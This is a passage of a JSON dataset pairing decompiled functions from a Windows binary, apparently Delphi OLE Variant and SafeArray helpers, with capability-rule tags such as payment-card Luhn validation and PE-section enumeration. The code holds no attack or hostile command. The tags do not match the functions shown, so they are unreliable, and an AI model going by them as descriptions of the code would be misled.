        "decompiled_code": "\nuint32_t __cdecl fcn.0041119c(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "004111cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004111cc(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.004111cc(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 235
    },
    "00411228": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00411228(void)\n\n{\n    char cVar1;\n    uint16_t *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint plLbound;\n    uint ppvData;\n    uint var_310h;\n    int32_t plUbound;\n    uint16_t *psa;\n    uint pvarg;\n    uint var_300h;\n    uint var_2fch;\n    uint rgIndices;\n    \n    if ((*(in_EAX + 1) & 0x20) == 0) {\n        fcn.00411070();\n    }\n    if ((*in_EAX & 0xfff) == 0xc) {\n        if ((*in_EAX & 0x4000) == 0) {\n            psa = *(in_EAX + 4);\n        }\n        else {\n            psa = **(in_EAX + 4);\n        }\n        uVar2 = *psa;\n        if (-1 < uVar2 - 1) {\n            iVar7 = 0;\n            piVar6 = &var_300h;\n            uVar5 = uVar2;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar7 + 1, piVar6 + 1);\n                fcn.00411070();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.00411070();\n                *piVar6 = (plUbound - piVar6[1]) + 1;\n                iVar7 = iVar7 + 1;\n                piVar6 = piVar6 + 2;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (-1 < uVar2 - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.0041119c(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex();\n                fcn.00411070();\n                fcn.00411420();\n            }\n            cVar1 = fcn.004111cc(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    sub.oleaut32.dll_VariantClear(in_EAX);\n    fcn.00411070();\n    return;\n}\n",
        "token_count": 628
    },
    "00411540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00411540(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 181
    },
    "00411570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411570(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.00411570(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 235
    },
    "004115cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004115cc(code *param_1, uint16_t *param_2)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint plLbound;\n    uint var_31ch;\n    uint ppvData;\n    uint16_t *psa;\n    uint32_t cDims;\n    int32_t plUbound;\n    code *var_308h;\n    ushort *pvargDest;\n    uint rgsabound;\n    uint var_2fch;\n    uint rgIndices;\n    \n    var_308h = param_1;\n    pvargDest = in_EAX;\n    if ((*(param_2 + 1) & 0x20) == 0) {\n        fcn.00411070();\n    }\n    if ((*param_2 & 0xfff) == 0xc) {\n        if ((*param_2 & 0x4000) == 0) {\n            psa = *(param_2 + 4);\n        }\n        else {\n            psa = **(param_2 + 4);\n        }\n        uVar2 = *psa;\n        cDims = uVar2;\n        if (-1 < uVar2 - 1) {\n            iVar6 = 0;\n            piVar5 = &rgsabound;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar6 + 1, piVar5 + 1);\n                fcn.00411070();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.00411070();\n                *piVar5 = (plUbound - piVar5[1]) + 1;\n                iVar6 = iVar6 + 1;\n                piVar5 = piVar5 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        iVar6 = sub.oleaut32.dll_SafeArrayCreate(0xc, cDims, &rgsabound);\n        if (iVar6 == 0) {\n            fcn.00410dc8();\n        }\n        fcn.00411420();\n        *pvargDest = 0x200c;\n        *(pvargDest + 4) = iVar6;\n        if (-1 < cDims - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            uVar2 = cDims;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.00411540(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(psa, &rgIndices, &ppvData);\n                fcn.00411070();\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(iVar6, &rgIndices, &var_31ch);\n                fcn.00411070();\n                (*var_308h)();\n            }\n            cVar1 = fcn.00411570(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    else {\n        sub.oleaut32.dll_VariantCopy(pvargDest, param_2);\n        fcn.00411070();\n    }\n    return;\n}\n",
        "token_count": 808
    },
    "00411890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411890(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    \n    puStack36 = &fcn.00411890::pvarg;\n    puStack40 = 0x4118a8;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x4118ec;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0041184c();\n    (**0x4aa984)();\n    fcn.00411b18();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x4118f3;\n    uStack44 = 0x4118eb;\n    fcn.00411420();\n    return;\n}\n",
        "token_count": 208
    },
    "00411df8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00411df8(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x4a503c)(&puStack24);\n    fcn.0041107c();\n    return 0x400;\n}\n",
        "token_count": 80
    },
    "00411e34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411e34(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_4h;\n    \n    puStack32 = &fcn.00411e34::pvarg;\n    puStack36 = 0x411e46;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x411e88;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0041184c();\n    (**0x4aa984)();\n    var_4h = fcn.00411edc();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x411e8f;\n    uStack40 = 0x411e87;\n    fcn.00411420();\n    return;\n}\n",
        "token_count": 221
    },
    "00411e98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00411e98(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    \n    uVar1 = fcn.00415f5c();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(3);\n        *param_2 = iStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 125
    },
    "004128f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004128f4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &fcn.004128f4::pvarg;\n    puStack40 = 0x412906;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x41294b;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0041184c();\n    (**0x4aa984)();\n    _var_8h = fcn.004129ac();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x412952;\n    uStack44 = 0x41294a;\n    fcn.00411420();\n    return;\n}\n",
        "token_count": 235
    },
    "00412960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00412960(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00415f5c();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(0x14);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 146
    },
    "00412ef4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412ef4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_1h;\n    \n    puStack32 = &fcn.00412ef4::pvarg;\n    puStack36 = 0x412f06;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x412f48;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.00412ef4::var_1h + 1;\n    fcn.0041184c();\n    (**0x4aa984)();\n    var_1h._0_1_ = fcn.00412fa4();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x412f4f;\n    uStack40 = 0x412f47;\n    fcn.00411420();\n    return;\n}\n",
        "token_count": 262
    },
    "004132f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004132f8(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x4133ad;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00414f48();\n    uVar3 = var_4h;\n    iVar2 = (***0x4a4ed4)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004056f4();\n        cVar1 = fcn.0040b678();\n        if (cVar1 == '\\0') {\n            fcn.0041107c();\n        }\n        else {\n            _var_10h = _var_20h;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.0041107c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x4133b4);\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 341
    },
    "004133bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.004133bc(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x4a503c)(auStack24);\n    fcn.0041107c();\n    return CONCAT44(auStack20, 5);\n}\n",
        "token_count": 76
    },
    "00413408": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413408(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.00413408::pvarg;\n    puStack40 = 0x41341a;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x41345d;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0041184c();\n    (**0x4aa984)();\n    fVar1 = fcn.004134b8();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x413464;\n    uStack44 = 0x41345c;\n    fcn.00411420();\n    return;\n}\n",
        "token_count": 231
    },
    "0041346c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.0041346c(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00415f5c();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(5);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 145
    },
    "004139c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004139c0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x413a9c;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00414f48();\n    uVar3 = var_4h;\n    iVar2 = (***0x4a4cb8)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004056f4();\n        cVar1 = fcn.0040d0a4();\n        if (cVar1 == '\\0') {\n            fcn.004056f4();\n            cVar1 = fcn.0040b694();\n            if (cVar1 == '\\0') {\n                fcn.0041107c();\n            }\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.0041107c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405490(0x413aa3);\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 368
    },
    "00413aac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00413aac(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x4a503c)(&pvarg, &pvarg, 0x400, 0, 7);\n    fcn.0041107c();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 159
    },
    "00413b0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00413b0c(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x4a503c)(auStack24);\n    fcn.0041107c();\n    return CONCAT44(auStack20, 7);\n}\n",
        "token_count": 78
    },
    "00413b58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413b58(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.00413b58::pvarg;\n    puStack40 = 0x413b6a;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x413bad;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0041184c();\n    (**0x4aa984)();\n    fVar1 = fcn.00413c08();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x413bb4;\n    uStack44 = 0x413bac;\n    fcn.00411420();\n    return;\n}\n",
        "token_count": 233
    },
    "00413bbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413bbc(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00415f5c();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(7);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 144
    },
    "00413f58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413f58(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x414004;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.00414f48();\n    uVar3 = var_4h;\n    iVar2 = (***0x4a50e0)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004056f4();\n        cVar1 = fcn.0040b6ec();\n        if (cVar1 == '\\0') {\n            fcn.0041107c();\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.0041107c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x41400b);\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 305
    },
    "00414014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00414014(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x4a503c)(&pvarg, &pvarg, 0x400, 0, 6);\n    fcn.0041107c();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 159
    },
    "00414074": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00414074(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x4a503c)(auStack24);\n    fcn.0041107c();\n    return CONCAT44(auStack20, 6);\n}\n",
        "token_count": 76
    },
    "004140c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004140c0(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    int64_t iStack12;\n    \n    puStack36 = &fcn.004140c0::pvarg;\n    puStack40 = 0x4140d2;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x414115;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0041184c();\n    (**0x4aa984)();\n    fVar1 = fcn.00414170();\n    iStack12 = ROUND(fVar1);\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41411c;\n    uStack44 = 0x414114;\n    fcn.00411420();\n    return;\n}\n",
        "token_count": 235
    },
    "00414124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00414124(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00415f5c();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(6);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 144
    },
    "00414670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414670(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x41472f;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = &fcn.00414670::pvarg;\n    puStack56 = 0x41469b;\n    sub.oleaut32.dll_VariantInit();\n    uStack60 = 0x41470d;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    (***0x4a503c)(&fcn.00414670::pvarg);\n    fcn.0041107c();\n    arg_8h = &fcn.00414670::var_14h;\n    fcn.00405d8c();\n    fcn.00405e78(arg_8h);\n    fcn.004056f4();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00411420(0x414714);\n    return;\n}\n",
        "token_count": 350
    },
    "0041473c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041473c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.0041473c::pvarg;\n    puStack36 = 0x414751;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x414792;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0041184c();\n    (**0x4aa984)();\n    fcn.00414828();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x414799;\n    uStack40 = 0x414791;\n    fcn.00411420();\n    return;\n}\n",
        "token_count": 203
    },
    "00414d64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414d64(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x414e0e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = &fcn.00414d64::pvarg;\n    puStack52 = 0x414d8c;\n    sub.oleaut32.dll_VariantInit();\n    uStack56 = 0x414df1;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uVar3 = 8;\n    uVar2 = 0;\n    uVar1 = 0x400;\n    puStack52 = &stack0xfffffffc;\n    (***0x4a503c)(&fcn.00414d64::pvarg);\n    fcn.0041107c();\n    fcn.00405d8c();\n    fcn.00405e78(param_2);\n    *in_FS_OFFSET = param_2;\n    fcn.00411420(0x414df8, uVar1, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 363
    },
    "00414e1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414e1c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00414e1c::pvarg;\n    puStack36 = 0x414e31;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x414e72;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0041184c();\n    (**0x4aa984)();\n    fcn.00414f48();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x414e79;\n    uStack40 = 0x414e71;\n    fcn.00411420();\n    return;\n}\n",
        "token_count": 210
    },
    "0041549c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
